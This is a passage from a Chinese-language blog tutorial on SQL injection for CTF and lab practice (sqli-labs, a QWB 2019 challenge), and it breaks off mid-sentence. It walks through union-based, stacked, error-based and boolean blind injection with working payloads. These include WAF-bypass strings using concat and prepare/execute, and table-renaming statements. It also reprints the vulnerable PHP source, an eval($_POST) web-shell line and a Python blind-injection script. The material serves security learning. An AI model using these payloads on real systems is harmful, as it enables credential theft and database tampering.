</p><p>看着很多，其实我们只需要关心三个表：<code>schemata</code>，<code>tables</code>，<code>columns</code>，它们分别能爆出数据库名，表名和字段名。</p><p>我们先看看第一个表 <code>schemata</code> 的具体信息：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/2.png" alt="2"></p><p>可以看到里面的<code>schema_name</code> 字段的值就是我们当前这个数据库系统中所有的数据库的名字，从左边也可以一一对应看到对应的数据库。</p><p>然后看看第二个表 <code>tables</code> 的信息。因为有点多我们看主要的：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/3.png" alt="3"></p><p>可以看到里面有一个 <code>table_name</code> 字段就是整个数据库系统的所有表名，然后前面的 <code>table_schema</code> 就是这个表对应的数据库名。这里也可以看到我们这个数据库能从中找到 <code>tables</code> 和 <code>schemata</code> 这两个表名，以及其它乱七八糟的在上一张图也都有显示。</p><h2 id="获得数据库信息的其它方式"><a href="#获得数据库信息的其它方式" class="headerlink" title="获得数据库信息的其它方式"></a>获得数据库信息的其它方式</h2><p>在我们有一个 <code>mysql</code> 连接的情况下，我们想查看所有的数据库很简单，一句 <code>show databases;</code> 即可解决，但是通常情况下我们这样子输入并不能很好的回显，如果把数据库名作为一条记录输出出来那处理起来会好很多。</p><p>我们想查看数据库还可以用这种方式：</p><p><code>select schema_name from information_schema.schemata;</code></p><p>我们对比一下两个指令的结果</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/4.png" alt="4"></p><p>可以看到结果基本就是一样的。然后我们想查看比如说 <code>world</code> 数据库的表名，我们一般先 <code>use world</code> 再 <code>show tables</code> 或者一句话 <code>show tables from world;</code> 直接输出表名，但是有 <code>information_schema</code> 这个数据库，我们就能通过这里把信息显示出来。</p><p><code>select table_name from information_schema.tables where table_schema=&#39;world&#39;;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/5.png" alt="5"></p><p>可以看到结果也是一模一样的。</p><p>剩下的爆字段就不演示了，同理的。</p><p><code>select column_name from information_schema.columns where table_name=&#39;city&#39;;</code></p><p>以上的 <code>payload</code> 可以直接在注入的地方加进去，只需要改一下表名和数据库名即可。</p><h2 id="sqli-labs环境搭建"><a href="#sqli-labs环境搭建" class="headerlink" title="sqli-labs环境搭建"></a>sqli-labs环境搭建</h2><p>主要学习的环境还是用的 <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a> ，我是直接在主机上搭建，因为修改代码起来十分方便，一改就能见到效果。但是这么做确保切断了对外界的网络连接，或者心大一点就算了，想着没人会对自己的主机发起进攻的。</p><p>然后自己再搭建一个 <code>web</code> 服务，能访问就算成功了。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/6.png" alt="6"></p><p>在使用之前在 <code>sqli-labs\sql-connections\</code> 目录下的 <code>db-creds.inc</code> 中配置一下自己的用户名和密码，再点击 <code>setup</code> 把数据库先配置好，如果一切OK，那么进入第一关的效果应该是这样的：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><h2 id="sql注入详解"><a href="#sql注入详解" class="headerlink" title="sql注入详解"></a>sql注入详解</h2><p>在对一个 <code>ctf</code> 打 <code>sql</code> 注入的时候，我们第一步就是要寻找<strong>注入点</strong>。怎么寻找注入点呢，因为后端源码我们都是不知道的，所以我们只能通过抓包的方式观察所有能<strong>提交的参数</strong>进行 <code>sql</code> 注入的测试。</p><p>找到注入点之后我们还需要判断注入的类型。大体的注入分两类，一类是<strong>有回显的注入</strong>，另一类是<strong>没有回显的注入</strong>。一般情况下我们优先考虑有回显的注入，因为时间成本比较低，那么我们先来看看有回显的注入吧。</p><h3 id="有回显的注入"><a href="#有回显的注入" class="headerlink" title="有回显的注入"></a>有回显的注入</h3><p>什么叫有回显？查询到的数据库信息会<strong>直接显示</strong>出来，你能看到的就叫有回显，反之则是没有回显。有回显的注入有以下类型：</p><ol><li>联合查询的注入：通过union关键字泄露数据库信息</li><li>堆叠注入：通过重新执行一个 <code>sql</code> 语句的方式泄露数据库信息，或者直接增删改查数据库。</li><li>报错注入：通过一些特殊的函数报错把信息显示出来。</li><li>二次注入：咕咕咕</li></ol><h4 id="联合查询的注入"><a href="#联合查询的注入" class="headerlink" title="联合查询的注入"></a>联合查询的注入</h4><p>利用要求：有回显</p><p>假如你是 <code>admin</code> 登录之后，它页面可能会显示 <code>hello,admin</code>。那么这个 <code>hello</code> 后面就是一个回显的点，这里就可以用来泄露其它信息。这里需要怎么理解呢，假如它在登录的逻辑是这样写的：</p><p><code>select username,passowrd from data.user where username=&#39;$input_username&#39; and password=&#39;$input_password&#39;;</code><br>然后我们判断你的账号密码是否正确就主要看它是否能查找到记录，如果找到，那么我选取这条记录的第一个记录的 <code>username</code> 字段，然后输出这个，就达到了它成功登录了什么账号，我输出那个账号的目的了。</p><p>至于上面为什么说是第一条记录呢，这里你需要这么看：<code>select</code> 的返回结果可能有很多，而不管它返回了一条还是多条它都是一个数据集，是个二维的表。因此选择第一条记录是开发人员默认会加上的，此时我只需使得前面的语句查询失败（返回空数据集）并选取其它内容用 <code>union</code> 合并这个数据集，并把这里的其它内容替换成我想知道的内容，比如它的数据库名，表名，然后它这里就会原样输出这些信息了，我们就知道了。这里需要知道 <code>union</code> 是合并两个数据集的，因此两个数据集的宽度（字段数）必须一样，数据类型可以不一样，返回 <code>php</code> 处理之后都会变成字符串类型其实。</p><p>这里我们拿刚刚搭建的环境的第一关来做测试：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><p>这里我们不需要寻找测试点了，它这里已经贴心地提醒我们用 <code>get</code> 传一个 <code>id</code> 参数进去了，因此我们先试 <code>1</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/8.png" alt="8"></p><p>可以看到我输入一个 <code>1</code> 它直接贴心的告诉了我们账号和密码是什么，这里显示的账号和密码就是回显的点。</p><p>我们再测试这个参数是否能注入，最简单最直接的方法就是打个单引号或者双引号进去。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/9.png" alt="10"></p><p>可以发现数据库报错，那就说明这个参数是可以注入的。</p><p>因此我们用刚刚提到的方法，先另前一个语句查询失败（空数据集），然后再 <code>union</code> 上一个数据集，这个数据集是我们任何我们想泄露的信息，首先我们假装对数据库一无所知，我们第一步就是要知道这里有多少数据库，分别什么名字。</p><p>根据报错信息可以略微猜测一下它的写法 <code>select username,password from xxx.yyy where id=&#39;$input_id&#39; limit 0,1</code></p><p>我们先用引号闭合前面的参数，然后后面加上一个 <code>and 1=0</code> 让前面的数据集必为空，然后再 <code>union select 1,2--+</code> ，这里需要测试参数的个数，因为你不知道前面有几个字段，不过这里可以姑且先猜个 <code>2</code>，因为目前看来就找了账号和密码嘛，最后用 <code>--+</code> 去注释后面的单引号。结果发现数据库报了这个错误：<code>The used SELECT statements have a different number of columns</code>，这个也不难看出来是因为 <code>union</code> 前后的数据集含有不同的列数，也就是字段数不一样，所以这里不是两个，那我们换成 <code>3</code> 个参数再看看，如果不行就接着换，知道不报这个错误为止。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/10.png" alt="11"></p><p>这里可以看到结果出来了，那么前面是有三列的，并且账号在第二列，密码在第三列，第一列大概率是这个 <code>id</code> 了。那么我们就朝着这几个回显的地方去改参数，比如我想知道数据库名，就用前面的方法。但是这里需要知道一点，那就是回显的地方这里只能存在一条记录，如果存在多条记录将报错。也就是说我可以把 <code>2</code> 替换成 <code>select xxx from zzzx.yyy</code> 但是必须保证结果集只能含有一条记录一个字段，否则会报错。一个字段没有问题，但是一条记录的话，你会想到 <code>limit</code>，可以，但是太慢了，如果数据记录很多一条一条打要累死人，这里我们用到之前讲过的聚合函数 <code>group_concat</code>，聚合函数会把所有记录整合成一条记录，并且我们还能一次输出多条记录的信息，那简直一举多得了。</p><p>我们开始报数据库名吧 <code>select schema_name from information_schema.schemata</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/11.png" alt="12"></p><p>可以看到我们爆出了当前数据库名和所有数据库名，这里需要注意，我们在替换为语句的时候，语句一定要加上括号，不然它的 <code>sql</code> 会分析失败。</p><p>然后我们爆一下 <code>security</code> 数据库的信息，先爆表名，其实只需要替换一下就可以了：<code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/12.png" alt="13"></p><p>我们主要收集一下用户信息吧，所以看看 <code>users</code> 数据表的内容，我们先获取字段名，一样一样地往上套就完事了：<code>select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/13.png" alt="13"></p><p>然后我们这里我们就看到了所有的字段名，我们这里点到为止，把所有用户名和密码爆出来就结束吧。</p><p><code>select group_concat(username) from security.users</code> 和 <code>select group_concat(password) from security.users</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/14.png" alt="14"></p><p>好，到这里我们就把数据库的信息成功获取到了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>我们可以看到联合查询注入十分方便，几步到位可以把数据库全部泄露出来，但是利用条件一般比较苛刻，需要有回显点才能实现。</p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入的原理就是使用引号隔开前一个查询语句，再自己书写另外的 <code>sql</code> 语句以此达到任意执行 <code>sql</code> 语句的目的。由于结果很难回显，我们一般这个用的不多，因为我们主要还是获取信息为主，而不是要去修改它的数据库。</p><p>这个演示我们用 <code>buuctf</code> 里面的一道题吧，是来自2019强网杯的一道题目。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/15.png" alt="15"></p><p>先不管它怎么说，有提交窗口先正常提交看看它原本的业务逻辑。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/16.png" alt="16"></p><p>看这个输出格式，应该也是从数据库里按照一个应该是 <code>id</code> 字段查询，查询结果为两个字段，然后用 <code>var_dump</code> 输出第一条记录的信息，然后按照国际惯例加个分号看它是否报错。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/17.png" alt="17"></p><p>报错了说明有注入点。</p><p>我们当然还是先试试联合查询注入，用 <code>1&#39; union select 1,2--+</code>，然后我们看到它回显了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>它过滤了很多关键字导致我们没办法直接使用联合查询注入，并且正则后面的 <code>/i</code> 表示大小写全匹配，那看来它是不想让你用联合查询注入，我们不妨先试试堆叠注入。我们可以先去 <code>mysql</code> 连接里面自己试试堆叠注入，比如我先实现一个逻辑，这个逻辑仅仅是查询每个数据库的表，那么数据库参数可控，我们就是这么写 <code>sql</code>  语句的：<code>select table_name from information_schema.tables where table_schema=&#39;$input_database&#39;;</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/18.png" alt="18"></p><p>可以看到随便输入一个数据库可以实现功能，那么我们让 <code>$input_database=1&#39;;show databases;--</code>，经过拼接之后形成了：</p><p><code>select table_name from information_schema.tables where table_schema=&#39;1&#39;;show databases;--&#39;;</code>。可以看到我们在参数中输入了其它的 <code>sql</code> 语句。那我们看看结果如何呢？不出意外地执行了我们输入的 <code>show databases</code> 指令。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/19.png" alt="19"></p><p>所以你也就清楚了堆叠注入是怎么一回事，我们试试看，一般题目里面堆叠注入都没有很好的回显，但是这题它有，至于为什么能有我们等会可以分析一下它题目的源码。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/20.png" alt="20"></p><p>再通过 <code>show tables</code> 我们可以发现有两张表 <code>1919810931114514</code> 和 <code>words</code>。然后我们下一步可以用 <code>show columns from table_name</code> 的方式去显示表中所有的字段名。先看看 <code>words</code> 表，发现有 <code>id</code> 和 <code>data</code> 字段，这里大胆点猜测，我们应该是根据 <code>id</code> 去查询 <code>data</code>。它的 <code>sql</code> 语句大概是 <code>select data from supersqli.words where id=&#39;$input_id&#39;</code>。</p><p>这里一个烫芝士注意一下啊，就是当数据库名或表名或列名可能引起歧义的时候，需要使用反引号将其包裹。比如你 <code>select 1,2,3</code> 我并不知道你想找的是 1,2,3 三个数值还是这 1,2,3 是列名。那么为了消除这个歧义我们在这个时候使用反引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `1`,`2`,`3`</span><br></pre></td></tr></table></figure><p>上述写法就是表示 1,2,3 代表列名，反引号在键盘上数字 <code>1</code> 的左边。</p><p>这里因为是全数字，所以我们用反引号才能显示出它所有的列，我们可以看到只有一个 <code>flag</code> 列。那 <code>flag</code> 应该是在里面，我们需要查询出它，这里就可以用到堆叠注入的另一种姿势：预编译。</p><p>我们也先来看看预编译的一般用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql=&#x27;show databases&#x27;;</span><br><span class="line">prepare ext from @sql;</span><br><span class="line">execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/21.png" alt="21"></p><p>可以发现它成功执行了 <code>show databases</code>，你可能会觉得一举两得了，但是这对于我们绕过 <code>WAF</code> 还是很有帮助的，它不让出现 <code>select</code> 这个单词的任意大小写形式，我们就用前面的字符串拼接函数 <code>concat</code> 就可以不出现 <code>select</code> 单词但是能执行 <code>select</code> 语句。</p><p>我们还是在这个 <code>cmd</code>  里面去运行。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/22.png" alt="22"></p><p>可以看到，我们利用 <code>concat</code> 函数和预编译的方式在全语句没有出现过 <code>select</code> 的情况下使用了 <code>select</code> 语句才能干的事。</p><p>因为在 <code>php</code> 里面，执行语句的时候才会产生一个进程去执行 <code>sql</code> 语句，语句结束进程也就结束，如果我先 <code>set @sql=&#39;xxx&#39;</code> 那么再次查询不会保存这个变量的结果，这里就需要把多条语句整合成一条，这也是堆叠注入特有的一个优势吧。</p><p>我们的 <code>payload</code> 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p>我们打进去的时候发现 <code>WAF</code> 还有一层检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个很好绕过，因为这个函数它判断大小写的，我们对这两个关键字随便一个字符大写即可绕过，我们最后的 <code>payload</code> 就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);Prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/23.png" alt="23"></p><p>成功获得 <code>flag</code>。</p><p>堆叠注入还有一个很厉害的姿势就是修改数据库，但是请注意不要删库，因为这样的话你可能就拿不到 <code>flag</code>。如果拿完 <code>flag</code> 再把 <code>flag</code> 删了，如果环境你专用你随便玩，公用的话就容易被别人喷了，万一环境不能重置，那你不是直接没了。</p><p>第二种方式是把装 <code>flag</code> 的表改成本来的逻辑查询的表，也就是 <code>words</code> 表。我们把那个表的名字改成 <code>words</code>，然后它可能是根据 <code>id</code> 查询的，我们就把 <code>flag</code> 列改成 <code>id</code> 也许它是根据 <code>words</code> 查询的，我们到时候改一下就好了。</p><p>先写出我们这几步的 <code>sql</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table `words` to `111`;</span><br><span class="line">rename table `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>如果成功的话我们只需要一个万能密码即可查出所有原 <code>flag</code> 表的所有记录。</p><p>我们的 <code>payload</code> 就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table `words` to `111`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>执行之后我们使用 <code>1&#39; or 1=1--+</code> 得到 <code>flag</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/24.png" alt="24"></p><p>堆叠注入为什么可以实现，下面就到了我们的源码环节了，没有官方的源码，只是从网上寻找到了差不多类似的，复现出来也基本一致。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmap是没有灵魂的 --&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    姿势: &lt;input type=&quot;text&quot; name=&quot;inject&quot; value=&quot;1&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function waf2($inject) &#123;</span><br><span class="line">    strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) &amp;&amp; die(&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;inject&#x27;])) &#123;</span><br><span class="line">    $id = $_GET[&#x27;inject&#x27;];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    //多条sql语句</span><br><span class="line">    $sql = &quot;select * from `words` where id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line">    if ($res)&#123;//使用multi_query()执行一条或多条sql语句</span><br><span class="line">      do&#123;</span><br><span class="line">        if ($rs = $mysqli-&gt;store_result())&#123;//store_result()方法获取第一条sql语句查询结果</span><br><span class="line">          while ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); //关闭结果集</span><br><span class="line">          if ($mysqli-&gt;more_results())&#123;  //判断是否还有更多结果集</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;while($mysqli-&gt;next_result()); //next_result()方法获取下一结果集，返回bool值</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;error &quot;.$mysqli-&gt;errno.&quot; : &quot;.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  //关闭数据库连接</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中间的源码环节可以看到它在执行 <code>sql</code> 语句的时候使用了 <code>multi_query</code> 函数，并且会输出所有的结果集。所以这题可以用堆叠注入的原因就在这里，我们可以很轻易地获得多条语句的回显，而在一般情况下是不能的，所以这题就是专门让你用堆叠注入的。</p><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>我们也来小总结一下堆叠注入：优点当然就是我们可以很轻易地执行多条 <code>sql</code> 语句，但是要求要回显所有的结果集，否则很多信息都是暴不出来的。如果你在普通的题目上使用堆叠注入，那么前面那个 <code>select</code> 就算是空集那它也不会返回第二个结果集的内容，所以这也成为了堆叠注入的局限性。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>利用一些函数的特性，通过它们的报错把信息泄露出来，当然前提是你可以看到它报错。</p><p>我们前面介绍的有关 <code>xml</code> 的函数都是报错注入常用的函数，我们先来看第一个 <code>updatexml</code> 。至于报错注入是什么呢？我来打个比方，有以下程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>已知包含的文件是一个 <code>$flag</code> 变量，标准输出流关闭的情况下如何知道 <code>flag</code> 的值？这么说吧，我们平时的一切正常输出都是标准输出流打印出来的。只有报错信息是标准错误流打印的，如果这里强制让我利用错误流输出，那么可以直接选择 <code>rm($flag)</code>。当它执行的时候这个函数就会报错 <code>xxx not found</code>，这个会通过错误流打印，而这里的 <code>xxx</code> 就是 <code>$flag</code> 变量的值。所以我们会让关键信息执行，然后通过报错使得打印这个关键的信息，因为我们不可能就是让它打印出 <code>$flag not found</code>，这里的 <code>$flag</code> 必须被解析执行成它里面的内容才是对我们有用的。</p><p>在有些情况下，它标准输出流并不能给我们带来什么回显的地方，比如常见的盲注，它标准输出流只会打印 <code>You are in</code> 或者 <code>You are not in</code>。这里如果它显示报错信息，我们同样可以使用报错注入去泄露信息。</p><p>我们看看第一个函数：<code>updatexml(xml,find,replacement)</code>就是一个  <code>xml</code> 替换的函数，这里中间的 <code>find</code> 参数必须使用 <code>Xpath</code> 格式，否则会报错并使用标准错误流打印第二个参数。</p><p>我们来试试看：使用如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,user(),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/25.png" alt="25"></p><p>可以看到虽然提示错误，但是还是成功打印了我们想要的内容，能报错注入的函数有很多，报错注入也不过多演示了。</p><h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><p>报错注入利用条件和联合查询注入差不多，报错注入需要能看到报错信息，报错信息是一个回显的点，有之后就跟联合查询注入差不多了，把 <code>updatexml</code> 函数第二个参数替换成自己想知道的东西。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>咕咕咕</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>无回显的注入又称为盲注。如果无回显或者回显的内容和数据库的内容没有直接关系，那么这个时候我们只能采用盲注的手段。盲注根据利用手法的不同又分为以下两种</p><ol><li>布尔盲注：如果网站根据有无查找成功，给你返回的有且仅有两个结果。我们的做法一般是，让前面 <code>where</code> 的条件恒为假，再 <code>or</code> 一个自己要判断的语句。或者让前面恒为真，再 <code>and</code> 一个我们要判断的结果，这样的话判断的就是我们想知道的结果了。</li><li>时间盲注：使用一个判断语句，再 <code>and</code> 或 <code>or</code> 一个 <code>sleep</code> 函数，根据是否休眠判断条件是否为真。</li><li>DNSlog盲注：当目标不能打印任何数据库信息，但是可以发起DNS请求的时候可以使用这个方式，这个讲道理不能叫盲注了，因为它能回显数据。</li></ol><p>盲注的特点就是，我一次打过去我最多知道 <code>1bit</code> 的数据，所以盲注手打是非常耗时的，下面我将演示手打和写脚本打。虽然在某些时候 <code>sqlmap</code> 有奇效，但是你得想过，出题人不可能会出一道 <code>sqlmap</code> 能直接跑出答案的题目，所以真材实料还得自己学会。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>我们打开 <code>sqli-labs-lesson5</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/26.png" alt="26"></p><p>可以看到它这里只回显了 <code>You are in</code>，就好比，你登陆成功了，上面不显示你的用户名，只是告诉了你登录成功，否则提示你账号或者密码错误。虽然报错有提示，但是我们不用，主要使用盲注来解决。</p><p>首先我们想知道有什么数据库，我们就象征性打一个数据库 <code>security</code> 下来吧，通过盲注的方式把这个数据库名获取到。</p><p>首先我们确定一下数据库名字多长</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;5--+</span><br></pre></td></tr></table></figure><p>小于5发现没有回显，我们换成 <code>&lt;8</code>，发现还是没有，再换成 <code>&lt;9</code> 发现有。我们就知道了数据库名长度为 <code>8</code> 了。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/27.png" alt="27"></p><p>接下来我们使用 <code>left</code> 函数截取字符串前缀，然后判断，我们一位一位开始判断。最后发现 <code>left(database(),1)=&#39;s&#39;</code> 返回正确结果。于是我们知道了数据库第一个字是 <code>s</code>。然后我们后面再一直这样判断，便能很快知道数据库名了。</p><p>这里为了提升自己，建议自己用 <code>python</code> 写一个脚本来进行盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure><p>我们看看运行结果。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/28.png" alt="28"></p><p>然后写一下跑数据库名称的脚本。这里需要解释一下为什么我们在截取字符的时候为什么要加 <code>ord</code>，因为 <code>mysql</code> 是不区分大小写的，所以直接字符串比较就可能出现 <code>mid(database(),1,1)&lt;&#39;T&#39;</code> 为 <code>true</code> 但是 <code>mid(database(),1,1)&lt;&#39;s&#39;</code> 为 